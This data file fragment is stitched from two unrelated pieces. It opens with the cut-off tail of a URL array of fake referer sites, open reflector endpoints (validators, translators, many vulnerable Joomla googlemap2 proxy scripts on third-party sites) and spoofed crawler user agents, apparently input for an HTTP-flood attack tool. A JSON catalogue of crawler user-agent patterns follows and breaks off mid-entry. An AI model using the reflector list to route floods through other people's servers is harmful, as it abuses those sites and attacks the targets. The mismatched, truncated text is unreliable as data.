"https://woman-orgasm.ru", "https://wordpress-crew.net", "https://wordpresscore.com", "https://workius.ru", "https://workona.com", "https://works.if.ua", "https://worldgamenews.com", "https://worldmed.info", "https://worldofbtc.com", "https://wpnull.org", "https://wrc-info.ru", "https://wufak.com", "https://ww2awards.info", "https://www-lk-rt.ru", "https://www.163.com", "https://www.1688.com", "https://www.1905.com", "https://www.2ch.net", "https://www.360.cn", "https://www.360.com", "https://www.39.net", "https://www.4399.com", "https://www.4dsply.com", "https://www.51.la", "https://www.51yes.com", "https://www.9gag.com", "https://www.about.com", "https://www.abs-cbn.com", "https://www.accuweather.com", "https://www.acfun.tv", "https://www.addthis.com", "https://www.adexc.net", "https://www.adf.ly", "https://www.adobe.com", "https://www.adplxmd.com", "https://www.airbnb.com", "https://www.albawabhnews.com", "https://www.alibaba.com", "https://www.aliexpress.com", "https://www.alipay.com", "https://www.allegro.pl", "https://www.amazon.ca", "https://www.amazon.cn", "https://www.amazon.co.jp", "https://www.amazon.co.uk", "https://www.amazon.com", "https://www.amazon.de", "https://www.amazon.es", "https://www.amazon.fr", "https://www.amazon.in", "https://www.amazon.it", "https://www.amazonaws.com", "https://www.ameblo.jp", "https://www.americanexpress.com", "https://www.ancestry.com", "https://www.aol.com", "https://www.apple.com", "https://www.archive.org", "https://www.ask.com", "https://www.ask.fm", "https://www.asos.com", "https://www.atlassian.net", "https://www.att.com", "https://www.avg.com", "https://www.avito.ru", "https://www.babytree.com", "https://www.badoo.com", "https://www.baidu.com", "https://www.bankofamerica.com", "https://www.battle.net", "https://www.bbc.co.uk", "https://www.bbc.com", "https://www.beeg.com", "https://www.behance.net", "https://www.bestbuy.com", "https://www.bet365.com", "https://www.bild.de", "https://www.bilibili.com", "https://www.billdesk.com", "https://www.bing.com", "https://www.bing.com/search?q=", "https://www.bitauto.com", "https://www.blastingnews.com", "https://www.blkget.com", "https://www.blog.jp", "https://www.blogger.com", "https://www.blogspot.com", "https://www.blogspot.com.br", "https://www.blogspot.in", "https://www.bloomberg.com", "https://www.bongacams.com", "https://www.booking.com", "https://www.box.com", "https://www.bp.blogspot.com", "https://www.bukalapak.com", "https://www.businessinsider.com", "https://www.buzzfeed.com", "https://www.buzzhand.com", "https://www.caijing.com.cn", "https://www.capitalone.com", "https://www.cctv.com", "https://www.chaoshi.tmall.com", "https://www.chase.com", "https://www.chaturbate.com", "https://www.china.com", "https://www.china.com.cn", "https://www.chinadaily.com.cn", "https://www.cia.gov/index.html", "https://www.citi.com", "https://www.clickadu.com", "https://www.cloudfront.net", "https://www.cnblogs.com", "https://www.cnet.com", "https://www.cnn.com", "https://www.cnnic.cn", "https://www.cntv.cn", "https://www.cnzz.com", "https://www.coccoc.com", "https://www.comcast.net", "https://www.conservativetribune.com", "https://www.craigslist.org", "https://www.csdn.net", "https://www.daikynguyenvn.com", "https://www.dailymail.co.uk", "https://www.dailymotion.com", "https://www.daum.net", "https://www.dell.com", "https://www.detail.tmall.com", "https://www.detik.com", "https://www.deviantart.com", "https://www.digikala.com", "https://www.diply.com", "https://www.directrev.com", "https://www.dmm.co.jp", "https://www.dmm.com", "https://www.doorblog.jp", "https://www.douban.com", "https://www.doubleclick.net", "https://www.doublepimp.com", "https://www.douyu.com", "https://www.dropbox.com", "https://www.eastday.com", "https://www.ebay-kleinanzeigen.de", "https://www.ebay.co.uk", "https://www.ebay.com", "https://www.ebay.de", "https://www.ebay.in", "https://www.ebay.it", "https://www.eksisozluk.com", "https://www.elpais.com", "https://www.enet.com.cn", "https://www.engadget.com", "https://www.espn.com", "https://www.espn.go.com", "https://www.espncricinfo.com", "https://www.etsy.com", "https://www.ettoday.net", "https://www.evernote.com", "https://www.exoclick.com", "https://www.expedia.com", "https://www.extratorrent.cc", "https://www.facebook.com", "https://www.facebook.com/", "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", "https://www.fbcdn.net", "https://www.fbi.com", "https://www.fbi.com/", "https://www.fc2.com", "https://www.fedex.com", "https://www.feedly.com", "https://www.fidelity.com", "https://www.files.wordpress.com", "https://www.flickr.com", "https://www.flipkart.com", "https://www.forbes.com", "https://www.force.com", "https://www.foxnews.com", "https://www.freepik.com", "https://www.friv.com", "https://www.gamer.com.tw", "https://www.gamersky.com", "https://www.gearbest.com", "https://www.gfycat.com", "https://www.giphy.com", "https://www.github.com", "https://www.github.io", "https://www.gizmodo.com", "https://www.globaloffers.link", "https://www.globo.com", "https://www.gmw.cn", "https://www.gmx.net", "https://www.go.com", "https://www.goal.com", "https://www.godaddy.com", "https://www.goo.ne.jp", "https://www.goodreads.com", "https://www.google.ad/search?q=", "https://www.google.ae", "https://www.google.ae/search?q=", "https://www.google.al/search?q=", "https://www.google.am/search?q=", "https://www.google.at", "https://www.google.az", "https://www.google.be", "https://www.google.ca", "https://www.google.ch", "https://www.google.cl", "https://www.google.cn", "https://www.google.co.ao/search?q=", "https://www.google.co.id", "https://www.google.co.il", "https://www.google.co.in", "https://www.google.co.jp", "https://www.google.co.kr", "https://www.google.co.th", "https://www.google.co.uk", "https://www.google.co.ve", "https://www.google.co.za", "https://www.google.com", "https://www.google.com.af/search?q=", "https://www.google.com.ag/search?q=", "https://www.google.com.ai/search?q=", "https://www.google.com.ar", "https://www.google.com.au", "https://www.google.com.bd", "https://www.google.com.br", "https://www.google.com.co", "https://www.google.com.eg", "https://www.google.com.hk", "https://www.google.com.mx", "https://www.google.com.ng", "https://www.google.com.pe", "https://www.google.com.ph", "https://www.google.com.pk", "https://www.google.com.sa", "https://www.google.com.sg", "https://www.google.com.tr", "https://www.google.com.tw", "https://www.google.com.ua", "https://www.google.com.vn", "https://www.google.com/search?q=", "https://www.google.cz", "https://www.google.de", "https://www.google.dk", "https://www.google.dz", "https://www.google.es", "https://www.google.fi", "https://www.google.fr", "https://www.google.gr", "https://www.google.hu", "https://www.google.ie", "https://www.google.it", "https://www.google.nl", "https://www.google.no", "https://www.google.pl", "https://www.google.pt", "https://www.google.ro", "https://www.google.ru", "https://www.google.se", "https://www.google.sk", "https://www.googleusercontent.com", "https://www.groupon.com", "https://www.gsmarena.com", "https://www.haber7.com", "https://www.hao123.com", "https://www.haosou.com", "https://www.hatenablog.com", "https://www.hclips.com", "https://www.hdfcbank.com", "https://www.homedepot.com", "https://www.hotstar.com", "https://www.hp.com", "https://www.huanqiu.com", "https://www.huffingtonpost.com", "https://www.hulu.com", "https://www.hurriyet.com.tr", "https://www.icicibank.com", "https://www.icloud.com", "https://www.ifeng.com", "https://www.ign.com", "https://www.ikea.com", "https://www.imdb.com", "https://www.imgur.com", "https://www.incometaxindiaefiling.gov.in", "https://www.indeed.com", "https://www.independent.co.uk", "https://www.indiatimes.com", "https://www.instagram.com", "https://www.intuit.com", "https://www.iqiyi.com", "https://www.irctc.co.in", "https://www.isanalyze.com", "https://www.jd.com", "https://www.kakaku.com", "https://www.kapanlagi.com", "https://www.kaskus.co.id", "https://www.kickstarter.com", "https://www.kinogo.club", "https://www.kinopoisk.ru", "https://www.kissanime.to", "https://www.kohls.com", "https://www.kompas.com", "https://www.le.com", "https://www.leboncoin.fr", "https://www.lifehacker.com", "https://www.linkedin.com", "https://www.liputan6.com", "https://www.list-manage.com", "https://www.list.tmall.com", "https://www.live.com", "https://www.livedoor.biz", "https://www.livedoor.com", "https://www.livedoor.jp", "https://www.livejasmin.com", "https://www.livejournal.com", "https://www.loading-delivery2.com", "https://www.lowes.com", "https://www.ltn.com.tw", "https://www.macys.com", "https://www.mail.ru", "https://www.mailchimp.com", "https://www.mama.cn", "https://www.marca.com", "https://www.mashable.com", "https://www.media.tumblr.com", "https://www.mediafire.com", "https://www.medium.com", "https://www.mega.nz", "https://www.mercadolivre.com.br", "https://www.merdeka.com", "https://www.messenger.com", "https://www.mi.com", "https://www.microsoft.com", "https://www.microsoftonline.com", "https://www.milliyet.com.tr", "https://www.mlb.com", "https://www.mozilla.org", "https://www.msn.com", "https://www.myway.com", "https://www.nametests.com", "https://www.naukri.com", "https://www.naver.com", "https://www.naver.jp", "https://www.nbcnews.com", "https://www.nbcolympics.com", "https://www.ndtv.com", "https://www.netflix.com", "https://www.nhk.or.jp", "https://www.nicovideo.jp", "https://www.nih.gov", "https://www.nordstrom.com", "https://www.nownews.com", "https://www.nyaa.se", "https://www.nytimes.com", "https://www.office.com", "https://www.ok.ru", "https://www.olx.pl", "https://www.onedio.com", "https://www.onet.pl", "https://www.onlinesbi.com", "https://www.openload.co", "https://www.oracle.com", "https://www.orange.fr", "https://www.ouo.io", "https://www.outbrain.com", "https://www.ozock.com", "https://www.panda.tv", "https://www.pandora.com", "https://www.paypal.com", "https://www.paytm.com", "https://www.pinimg.com", "https://www.pinterest.com", "https://www.pixiv.net", "https://www.pixnet.net", "https://www.pokevision.com", "https://www.popads.net", "https://www.popcash.net", "https://www.prjcq.com", "https://www.ps4ux.com", "https://www.putlocker.is", "https://www.qq.com", "https://www.quora.com", "https://www.qwant.com/search?q=", "https://www.rakuten.co.jp", "https://www.rambler.ru", "https://www.rarbg.to", "https://www.reddit.com", "https://www.reddituploads.com", "https://www.redtube.com", "https://www.reimageplus.com", "https://www.repubblica.it", "https://www.reuters.com", "https://www.rio2016.com", "https://www.roblox.com", "https://www.rt.com", "https://www.rutracker.org", "https://www.sabah.com.tr", "https://www.sahibinden.com", "https://www.salesforce.com", "https://www.samsung.com", "https://www.savefrom.net", "https://www.sberbank.ru", "https://www.scribd.com", "https://www.scribol.com", "https://www.secureserver.net", "https://www.seznam.cz", "https://www.sh.st", "https://www.sharepoint.com", "https://www.shopify.com", "https://www.shutterstock.com", "https://www.sina.com.cn", "https://www.siteadvisor.com", "https://www.skype.com", "https://www.slack.com", "https://www.slickdeals.net", "https://www.slideshare.net", "https://www.snapdeal.com", "https://www.so.com", "https://www.softonic.com", "https://www.sogou.com", "https://www.sohu.com", "https://www.soso.com", "https://www.soundcloud.com", "https://www.sourceforge.net", "https://www.speedtest.net", "https://www.spiegel.de", "https://www.spotify.com", "https://www.stackexchange.com", "https://www.stackoverflow.com", "https://www.steamcommunity.com", "https://www.steampowered.com", "https://www.suning.com", "https://www.t-online.de", "https://www.t.co", "https://www.taboola.com", "https://www.taleo.net", "https://www.taobao.com", "https://www.target.com", "https://www.taringa.net", "https://www.ted.com/search?q=", "https://www.telegram.org", "https://www.telegraph.co.uk", "https://www.terraclicks.com", "https://www.theguardian.com", "https://www.theladbible.com", "https://www.themeforest.net", "https://www.thepiratebay.org", "https://www.thesaurus.com", "https://www.thewhizmarketing.com", "https://www.tianya.cn", "https://www.tistory.com", "https://www.tmall.com", "https://www.tokopedia.com", "https://www.torrentz.eu", "https://www.trello.com", "https://www.tribunnews.com", "https://www.tripadvisor.com", "https://www.tube8.com", "https://www.tuberel.com", "https://www.tudou.com", "https://www.tumblr.com", "https://www.twimg.com", "https://www.twitch.tv", "https://www.twitter.com", "https://www.txxx.com", "https://www.uol.com.br", "https://www.uploaded.net", "https://www.ups.com", "https://www.uptodown.com", "https://www.urdupoint.com", "https://www.usaa.com", "https://www.usatoday.com", "https://www.usatoday.com/search/results?q=", "https://www.usps.com", "https://www.varzesh3.com", "https://www.verizonwireless.com", "https://www.vice.com", "https://www.videomega.tv", "https://www.vimeo.com", "https://www.viralthread.com", "https://www.vk.com", "https://www.w3schools.com", "https://www.walmart.com", "https://www.washingtonpost.com", "https://www.weather.com", "https://www.web.de", "https://www.webmd.com", "https://www.webtretho.com", "https://www.weebly.com", "https://www.weibo.com", "https://www.wellsfargo.com", "https://www.wetransfer.com", "https://www.whatsapp.com", "https://www.wikia.com", "https://www.wikihow.com", "https://www.wikimedia.org", "https://www.wikipedia.org", "https://www.wix.com", "https://www.wordpress.com", "https://www.wordpress.org", "https://www.wordreference.com", "https://www.wp.pl", "https://www.wsj.com", "https://www.wwwpromoter.com", "https://www.xda-developers.com", "https://www.xfinity.com", "https://www.xhamster.com", "https://www.xinhuanet.com", "https://www.xnxx.com", "https://www.xywy.com", "https://www.yahoo.co.jp", "https://www.yahoo.com", "https://www.yandex.ru", "https://www.yelp.com", "https://www.yesky.com", "https://www.youku.com", "https://www.youm7.com", "https://www.youth.cn", "https://www.youtube-mp3.org", "https://www.youtube.com", "https://www.youtube.com/", "https://www.zendesk.com", "https://www.zhihu.com", "https://www.zillow.com", "https://www.zippyshare.com", "https://www.zoho.com", "https://www.zol.com.cn", "https://x-lime.com", "https://x-lime.net", "https://x5market.ru", "https://xaker26.net", "https://xexe.club", "https://xkaz.org", "https://xn-------53dbcapga5atlplfdm6ag1ab1bvehl0b7toa0k.xn--p1ai", "https://xn------6cdbciescapvf0a8bibwx0a1bu.xn--90ais", "https://xn-----6kcamwewcd9bayelq.xn--p1ai", "https://xn-----7kcaaxchbbmgncr7chzy0k0hk.xn--p1ai", "https://xn-----clckdac3bsfgdft3aebjp5etek.xn--p1ai", "https://xn----7sbabb9a1b7bddgm6a1i.xn--p1ai", "https://xn----7sbabhjc3ccc5aggbzfmfi.xn--p1ai", "https://xn----7sbabhv4abd8aih6bb7k.xn--p1ai", "https://xn----7sbabm1ahc4b2aqff.su", "https://xn----7sbabn5abjehfwi8bj.xn--p1ai", "https://xn----7sbbpe3afguye.xn--p1ai", "https://xn----7sbho2agebbhlivy.xn--p1ai", "https://xn----8sbaki4azawu5b.xn--p1ai", "https://xn----8sbarihbihxpxqgaf0g1e.xn--80adxhks", "https://xn----8sbbjimdeyfsi.xn--p1ai", "https://xn----8sbhefaln6acifdaon5c6f4axh.xn--p1ai", "https://xn----8sblgmbj1a1bk8l.xn----161-4vemb6cjl7anbaea3afninj.xn--p1ai", "https://xn----8sbowe2akbcd4h.xn--p1ai", "https://xn----8sbpmgeilbd8achi0c.xn--p1ai", "https://xn----btbdvdh4aafrfciljm6k.xn--p1ai", "https://xn----ctbbcjd3dbsehgi.xn--p1ai", "https://xn----ctbfcdjl8baejhfb1oh.xn--p1ai", "https://xn----ctbigni3aj4h.xn--p1ai", "https://xn----dtbffp5aagjgfm.xn--p1ai", "https://xn----ftbeoaiyg1ak1cb7d.xn--p1ai", "https://xn----itbbudqejbfpg3l.com", "https://xn----jtbjfcbdfr0afji4m.xn--p1ai", "https://xn--78-6kcmzqfpcb1amd1q.xn--p1ai", "https://xn--80aaajkrncdlqdh6ane8t.xn--p1ai", "https://xn--80aabcsc3bqirlt.xn--p1ai", "https://xn--80aanaardaperhcem4a6i.com", "https://xn--80adaggc5bdhlfamsfdij4p7b.xn--p1ai", "https://xn--80adgcaax6acohn6r.xn--p1ai", "https://xn--80aeb6argv.xn--p1ai", "https://xn--80ahdheogk5l.xn--p1ai", "https://xn--90acenikpebbdd4f6d.xn--p1ai", "https://xn--90acjmaltae3acm.xn--p1acf", "https://xn--c1acygb.xn--p1ai", "https://xn--d1abj0abs9d.in.ua", "https://xn--d1aifoe0a9a.top", "https://xn--e1aaajzchnkg.ru.com", "https://xn--e1aahcgdjkg4aeje6j.kz", "https://xn--e1agf4c.xn--80adxhks", "https://xpert.com.ua", "https://xrp-ripple.info", "https://xtraffic.plus", "https://xtrafficplus.com", "https://xxxhamster.me", "https://xz618.com", "https://yaderenergy.ru", "https://yes-com.com", "https://yes-do-now.com", "https://yhirurga.ru", "https://ykecwqlixx.ru", "https://yodse.io", "https://yoga4.ru", "https://yougame.biz", "https://youhack.info", "https://youporn-forum.ga", "https://youporn-ru.com", "https://your-good-links.com", "https://your-tales.ru", "https://yourserverisdown.com", "https://yur-p.ru", "https://yurcons.pro", "https://yuristproffi.ru", "https://zagadki.in.ua", "https://zahodi2hydra.net", "https://zahvat.ru", "https://zakaznoy.com.ua", "https://zakis-azota24.ru", "https://zakisazota-official.com", "https://zamolotkom.ru", "https://zapnado.ru", "https://zarabotat-v-internete.biz", "https://zastroyka.org", "https://zavod-gm.ru", "https://zdm-auto.com", "https://zdm-auto.ru", "https://zdorovie-nogi.info", "https://zelena-mriya.com.ua", "https://zhcsapp.net", "https://zhoobintravel.com", "https://zonefiles.bid", "https://zot.moscow", "https://zt-m.ru", "https://zvetki.ru", "https://zvooq.eu", "https://zvuker.net","https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=","https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=","https://drive.google.com/viewerng/viewer?url=","http://www.google.com/translate?u=","https://developers.google.com/speed/pagespeed/insights/?url=","http://help.baidu.com/searchResult?keywords=","http://www.bing.com/search?q=","https://add.my.yahoo.com/rss?url=","https://play.google.com/store/search?q=","http://www.google.com/?q=","http://regex.info/exif.cgi?url=","http://anonymouse.org/cgi-bin/anon-www.cgi/","http://www.google.com/translate?u=","http://translate.google.com/translate?u=","http://validator.w3.org/feed/check.cgi?url=","http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=","http://validator.w3.org/check?uri=","http://jigsaw.w3.org/css-validator/validator?uri=","http://validator.w3.org/checklink?uri=","http://www.w3.org/RDF/Validator/ARPServlet?URI=","http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=","http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=","http://validator.w3.org/mobile/check?docAddr=","http://validator.w3.org/p3p/20020128/p3p.pl?uri=","http://online.htmlvalidator.com/php/onlinevallite.php?url=http://online.htmlvalidator.com/php/onlinevallite.php?url=","http://feedvalidator.org/check.cgi?url=","http://gmodules.com/ig/creator?url=","http://www.google.com/ig/adde?moduleurl=","http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=","http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=","http://host-tracker.com/check_page/?furl=","http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=","http://www.onlinewebcheck.com/check.php?url=","http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=","","http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=","http://about42.nl/www/showheaders.php;POST;about42.nl.txt","http://browsershots.org;POST;browsershots.org.txt","http://streamitwebseries.twww.tv/proxy.php?url=","http://www.comicgeekspeak.com/proxy.php?url=","http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=","http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=","http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=","http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=","http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS","http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=","http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=","http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=","http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=","http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=","http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=","http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=","http://site/uniquesig697e96fe58e5694d9b118768d8189a4c/uniquesig0/InternalSite/InitParams.aspx?referrer=/InternalSite/StartApp.asp&resource%5Fid=8B92B86E36904E2FA83C890F8C864A50&login%5Ftype=0&site%5Fname=test&secure=0&URLHASH=47c74c53%2Dfaae%2D41ae%2D89f1%2D1eb6eff34091&orig%5Furl=","Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php) Grapeshot Bot 2.0","Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/) Majestic-12 Distributed Search Bot 1.4","Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;","Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34  # Pattern: CloudFlare-AlwaysOnline / URL:","TangibleeBot/1.0.0.0 (http://tangiblee.com/bot)  # Pattern: TangibleeBot / URL: http://tangiblee.com/bot","Amazon CloudFront  # Pattern: Amazon CloudFront / URL: https://aws.amazon.com/cloudfront/","Mozilla/5.0 (compatible; ZuperlistBot/1.0)  # Pattern: ZuperlistBot\/",]


[
  {
    "pattern": "Googlebot\\/",
    "url": "http://www.google.com/bot.html",
    "instances": [
      "Googlebot/2.1 (+http://www.google.com/bot.html)",
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "Googlebot-Mobile",
    "instances": [
      "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Googlebot-Image",
    "instances": [
      "Googlebot-Image/1.0"
    ]
  }
  ,
  {
    "pattern": "Googlebot-News",
    "instances": [
      "Googlebot-News"
    ]
  }
  ,
  {
    "pattern": "Googlebot-Video",
    "instances": [
      "Googlebot-Video/1.0"
    ]
  }
  ,
  {
    "pattern": "AdsBot-Google([^-]|$)",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": [
      "AdsBot-Google (+http://www.google.com/adsbot.html)"
    ]
  }
  ,
  {
    "pattern": "AdsBot-Google-Mobile",
    "addition_date": "2017/08/21",
    "url": "https://support.google.com/adwords/answer/2404197",
    "instances": [
      "AdsBot-Google-Mobile-Apps",
      "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
    ]
  }
  ,
  {
    "pattern": "Feedfetcher-Google",
    "addition_date": "2018/06/27",
    "url": "https://support.google.com/webmasters/answer/178852",
    "instances": [
      "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=728742641706423)"
    ]
  }
  ,
  {
    "pattern": "Mediapartners-Google",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": [
      "Mediapartners-Google",
      "Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0 (Following Mediapartners-Google)",
      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 10_0 like Mac OS X; en-us) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A5297c Safari/602.1 (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Mediapartners \\(Googlebot\\)",
    "addition_date": "2017/08/08",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": []
  }
  ,
  {
    "pattern": "APIs-Google",
    "addition_date": "2017/08/08",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": [
      "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)"
    ]
  }
  ,
  {
    "pattern": "bingbot",
    "url": "http://www.bing.com/bingbot.htm",
    "instances": [
      "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm",
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) SitemapProbe",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
